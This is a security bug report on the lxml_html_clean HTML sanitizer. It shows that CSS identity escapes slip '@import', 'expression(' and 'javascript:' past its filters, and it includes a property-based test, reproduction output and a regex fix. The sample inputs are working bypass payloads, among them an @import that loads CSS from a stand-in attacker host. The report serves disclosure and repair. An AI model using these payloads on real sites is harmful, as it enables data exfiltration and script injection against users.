# Bug Report: lxml_html_clean.clean CSS identity escapes bypass `@import` / `expression(` / `javascript:` filtering

**Target**: `lxml_html_clean.clean` (`Cleaner._has_sneaky_javascript` / `Cleaner._decode_css_unicode_escapes`)
**Severity**: High
**Bug Type**: Logic (security)
**Date**: 2026-10-06

## Summary

`Cleaner._decode_css_unicode_escapes` only decodes hex escapes (`\69`). CSS also has identity escapes: a backslash followed by any non-hex, non-newline character stands for that character (CSS Syntax Level 3 §4.3.7). So `@\import`, `e\xpression(` and `url(j\avascript:...)` get past `_has_sneaky_javascript` and stay in the cleaned `<style>` content and `style` attributes. Browsers decode them to `@import`, `expression(` and `javascript:`.

## Property-Based Test

```python
import re
from hypothesis import given, settings, strategies as st
from lxml_html_clean import clean_html
from lxml.html import fromstring

HEX = set("0123456789abcdefABCDEF")

def css_unescape(s):
    """CSS Syntax Level 3 escape handling (§4.3.7)."""
    out, i = [], 0
    while i < len(s):
        c = s[i]
        if c == "\\" and i + 1 < len(s) and s[i + 1] != "\n":
            j = i + 1
            if s[j] in HEX:
                k = j
                while k < len(s) and k - j < 6 and s[k] in HEX:
                    k += 1
                cp = int(s[j:k], 16)
                out.append(chr(cp) if 0 < cp <= 0x10FFFF and not 0xD800 <= cp <= 0xDFFF else "\ufffd")
                if k < len(s) and s[k] in " \t\n":
                    k += 1
                i = k
            else:
                out.append(s[j]); i = j + 1
        else:
            out.append(c); i += 1
    return "".join(out)

def encode_char(c):
    choices = [st.just(c), st.just("\\%x " % ord(c)), st.just("\\%06x" % ord(c))]
    if c not in HEX and c != "\n":
        choices.append(st.just("\\" + c))
    return st.one_of(choices)

def obfuscated(word):
    return st.tuples(*[encode_char(c) for c in word]).map("".join)

dangerous_css = st.one_of(
    st.tuples(st.just("@"), obfuscated("import"), st.just(" url(http://evil.example/x.css);")).map("".join),
    st.tuples(st.just("a{width:"), obfuscated("expression"), st.just("(alert(1))}")).map("".join),
    st.tuples(st.just("a{background:url("), obfuscated("javascript"), st.just(":alert(1))}")).map("".join),
)

@settings(max_examples=500)
@given(dangerous_css)
def test_style_tag_has_no_dangerous_css(css):
    out = clean_html("<div><style>%s</style><p>x</p></div>" % css)
    for el in fromstring(out).iter("style"):
        text = re.sub(r"\s+", "", css_unescape(re.sub(r"/\*.*?\*/", "", el.text or "", flags=re.S)).lower())
        assert "@import" not in text
        assert "expression(" not in text
        assert "javascript:" not in text
```

**Failing inputs** (one for each payload type): `'@impor\\t url(http://evil.example/x.css);'`, `'a{width:express\\ion(alert(1))}'`, `'a{background:url(javasc\\ript:alert(1))}'`

Every hex-escaped variant is caught. Only identity escapes get through.

## Reproducing the Bug

```python
from lxml_html_clean import clean_html, Cleaner
from lxml.html import defs

print(clean_html('<div><style>@import url(http://evil.example/x.css);</style></div>'))
print(clean_html('<div><style>@\\69mport url(http://evil.example/x.css);</style></div>'))
print(clean_html('<div><style>@\\import url(http://evil.example/x.css);</style></div>'))

c = Cleaner(safe_attrs=defs.safe_attrs | {'style'})
print(c.clean_html('<div><p style="background:url(j\\avascript:alert(1))">x</p></div>'))
```

Output:
```
<div><style> url(http://evil.example/x.css);</style></div>
<div><style>/* deleted */</style></div>
<div><style>@\import url(http://evil.example/x.css);</style></div>
<div><p style="background:url(j\avascript:alert(1))">x</p></div>
```

## Why This Is A Bug

The cleaner's stated goal is that "the imported CSS can do anything; we just can't allow" `@import`. `_decode_css_unicode_escapes` was added to stop people "bypassing security checks using CSS escape sequences". But a CSS tokenizer treats `@\import` exactly like `@import`: the at-keyword name unescapes to `import`. So an attacker can still make a page that uses `<style>` with default `Cleaner` settings load arbitrary external CSS, which enables CSS-based data exfiltration and UI redressing. It is the same class of bypass the hex-escape fix was meant to close. The same gap affects `expression(` (legacy IE) and `javascript:` inside `url()`.

## Fix

```diff
--- a/lxml_html_clean/clean.py
+++ b/lxml_html_clean/clean.py
@@
-    _css_unicode_escape_re = re.compile(r'\\([0-9a-fA-F]{1,6})\s?')
+    _css_unicode_escape_re = re.compile(r'\\(?:([0-9a-fA-F]{1,6})\s?|([^\n0-9a-fA-F]))')
@@
         def replace_escape(match):
             hex_value = match.group(1)
+            if hex_value is None:
+                return match.group(2)
             try:
                 return chr(int(hex_value, 16))
```

With this patch all the property tests pass, and the project's existing test suite gives the same results as before (3 doctest failures that are already present without the patch).
